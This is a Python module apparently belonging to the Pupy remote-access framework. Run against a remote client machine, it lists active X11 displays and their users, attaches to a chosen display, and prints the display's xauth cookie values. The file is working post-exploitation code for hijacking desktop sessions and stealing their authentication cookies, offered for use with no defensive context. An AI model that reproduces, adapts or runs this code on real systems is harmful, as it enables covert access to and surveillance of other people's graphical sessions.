# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser

__class_name__="Display"

@config(compat="posix", cat="admin")
class Display(PupyModule):
    """ Set display variable """

    dependencies = ['display']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='users', description=cls.__doc__)
        cls.arg_parser.add_argument('-x', '--xauth', help='Path to .Xauthority')
        cls.arg_parser.add_argument('-X', '--print-xauth', action='store_true',
                                         help='Print xauth information for current hostname')
        cls.arg_parser.add_argument('display', nargs='?', help='Display to use')

    def run(self, args):
        attach_to_display = self.client.remote('display', 'attach_to_display', False)
        extract_xauth_info = self.client.remote('display', 'extract_xauth_info')
        guess_displays = self.client.remote('display', 'guess_displays')

        if args.display:
            if attach_to_display(args.display, args.xauth):
                self.success('Attached to {}'.format(args.display))
                if args.print_xauth:
                    info = extract_xauth_info(args.display)
                    if info:
                        family, host, display, cookie, value = info
                        self.success('xauth: {}:{}/{} {} {}'.format(
                            host, display, family, cookie, value
                        ))
                    else:
                        self.error('xauth: entries not found')
            else:
                self.error('Couldn\'t attach to {}'.format(args.display))
        else:
            displays = guess_displays()
            for display, items in displays.iteritems():
                for item in items:
                    self.success('{} user={} xauth={}'.format(display, item[0], item[1]))
